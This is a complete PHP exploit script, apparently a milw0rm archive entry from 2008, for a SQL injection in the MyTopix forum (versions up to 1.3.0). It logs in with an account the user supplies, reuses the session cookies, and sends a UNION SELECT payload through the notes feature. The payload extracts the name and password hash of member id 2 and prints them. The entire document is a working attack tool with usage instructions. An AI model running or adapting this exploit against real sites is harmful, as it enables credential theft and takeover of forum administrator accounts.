<?php

/**
*
* MyTopix <= 1.3.0 (notes send) Remote SQL Injection Exploit
* Bug discovered & exploited by cOndemned
* 
* Desc :
*	In order to exploit this vulnerability user have to
*	be logged on the forum, so I'd decided to write this
*	exploit x]
*
* Greetz : 
*	Ex. fobidd3n t3am - Sw33t, Kr0licz3k & KraFT, irk4z,
*	ZaBeaTy, Necro, str0ke, suN8Hclf, 0in, m4r1usz, TBH, 
*	Av...
*
*
*	"What is left to die for? What is left to give..."
*/


class MyTopixSploit
{
	private $socket;
	private $evil;
	private $inj;
	private $host;
	private $path;
	private $login;
	private $password;
	private $csid;
	private $cpass;

	public function __construct()
	{
		$this -> evil	= '';
		$this -> socket	= socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$this -> inj	= '-1+UNION+SELECT+concat(members_name,0x3a,members_pass)+FROM+my_members+WHERE+members_id=2--';
	}

	private function send($packet)
	{
		if(!$this -> socket) $this -> socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

		socket_connect($this -> socket, gethostbyname($this -> host), 80) or die("[-] Couldn't connect with specified host\r\n");
		socket_write($this -> socket, $packet, strlen($packet)) or die("[-] Couldn't send requrested packet\r\n");

		while($resp = socket_read($this -> socket, 2048)) $output .= $resp;

		socket_shutdown($this -> socket, 2);
		socket_close($this -> socket);
		unset($this -> socket);

		return $output;	
	}

	public function target($host, $path)
	{
		$this -> host = (substr($host, 0, 7) === 'http://') ? substr($host, 7) : $host;
		$this -> path = (substr($path, -1) === '/') ? substr($path, 0, -1) : $path;
	}

	public function usage()
	{
		return "[~] Usage : php mytopix130-sql.php <target_host> <path> <username> <user-pass>\r\n\r\n";
	}

	public function login($login, $password)
	{
		$post = "username=$login&password=$password&hash=5aaaea2d9cd5b549a857e02190cb4542";
		$this -> evil = 
			"POST {$this -> path}/index.php?a=logon&CODE=01 HTTP/1.1\r\n" .
			"Host: {$this -> host}\r\n" .
			"Referer: http://{$this -> host}{$this -> path}\r\n" . 
			"User-Agent: Opera/9.62 (X11; Linux i686; U; pl) Presto/2.1.1\r\n" .
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*#/*;q=0.8\r\n" .
			"Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n" .
			"Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7\r\n" .
			"Connection: Close\r\n" . 
			"Content-Type: application/x-www-form-urlencoded\r\n" .
			"Content-length: " . strlen($post) . "\r\n\r\n$post";

		return $this -> send($this -> evil);
	}

	public function inject($cid, $cpass)
	{
		$this -> evil =
			"GET {$this->path}/index.php?a=notes&CODE=07&send=$this->inj HTTP/1.1\r\n" . 
			"Host: {$this->host}\r\n" . 
			"Referer: http://{$this->host}{$this->path}/\r\n" . 
			"User-Agent: Opera/9.62 (X11; Linux i686; U; pl) Presto/2.1.1\r\n" .
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" . 
			"Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n" . 
			"Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7\r\n" . 
			"Cookie: my_id={$cid}; my_pass={$cpass}\r\n" . 
			"Connection: close\r\n\r\n";

		return $this -> send($this -> evil);
	}
}; 


$xpl = new MyTopixSploit();

echo <<< HEADER

+--------------------------------------------------------------------------+
|                                                                          |
|        MyTopix <= 1.3.0 (notes send) Remote SQL Injection Exploit        |
|        ==========================================================        |
|        Author ......................................... cOndemned        |
|        Contact ...................... digital_future[at]p2[dot]pl        |
|        Conditions ......................... Need account on forum        |
|                                                                          |
+--------------------------------------------------------------------------+


HEADER;

if($argc != 5) 
	echo $xpl -> usage();
else 
{
	list($script, $host, $path, $login, $password) = $argv;
	
	$xpl -> target($host, $path);
	$head = $xpl -> login($login, $password);
	
	printf("[~] Trying to login with nick: %s, and password: %s...\r\n", $login, $password);

	$cookie['USERID'] = preg_match_all('!id=([0-9]+);!is', $head, $tmp) ? $tmp[1][0] : die("[-] Couldn't retrive user id\r\n");
	$cookie['PASSWD'] = preg_match_all('!pass=([a-f0-9]{32});!is', $head, $tmp) ? $tmp[1][0] : die("[-] Couldn't retrive user password\r\n");
	
	$src = $xpl -> inject($cookie['USERID'], $cookie['PASSWD']);
	
	printf("[~] Sending packet ...\r\n");

	$resp = preg_match_all("!value='([a-z0-9]+?):([a-f0-9]+?)'!is", $src, $out) 
		? "[+] Login: {$out[1][0]}\r\n[+] Pass: {$out[2][0]}" : "[-] Exploitation failed";

	printf("[~] Done...\r\n%s \r\n\r\n", $resp);
}

?>

# milw0rm.com [2008-11-19]
